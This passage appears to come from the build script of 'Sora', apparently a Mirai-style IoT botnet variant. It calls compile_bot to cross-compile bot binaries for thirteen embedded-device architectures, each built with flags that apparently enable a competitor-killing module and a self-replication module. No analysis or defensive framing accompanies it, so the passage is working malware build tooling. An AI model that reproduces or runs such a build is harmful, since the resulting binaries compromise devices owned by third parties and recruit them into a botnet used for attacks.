...
compile_bot i586 sora.x86 "-static -DKILLER -DSELFREP -DSTABLE"
compile_bot x86_64 sora.x86_64 "-static -DKILLER -DSELFREP -DSTABLE"
compile_bot i686 sora.i686 "-static -DKILLER -DSELFREP -DSTABLE"
compile_bot mips sora.mips "-static -DKILLER -DSELFREP -DSTABLE"
compile_bot mipsel sora.mpsl "-static -DKILLER -DSELFREP -DSTABLE"
compile_bot armv4l sora.arm "-static -DKILLER -DSELFREP -DSTABLE"
compile_bot armv5l sora.arm5 "-DKILLER -DSELFREP -DSTABLE"
compile_bot armv6l sora.arm6 "-static -DKILLER -DSELFREP -DSTABLE"
compile_bot armv7l sora.arm7 "-static -DKILLER -DSELFREP -DSTABLE"
compile_bot powerpc sora.ppc "-static -DKILLER -DSELFREP -DSTABLE"
compile_bot sparc sora.spc "-static -DKILLER -DSELFREP -DSTABLE"
compile_bot m68k sora.m68k "-static -DKILLER -DSELFREP -DSTABLE"
compile_bot sh4 sora.sh4 "-static -DKILLER -DSELFREP -DSTABLE"
echo -e "\e[01;36mDone\e[0m"
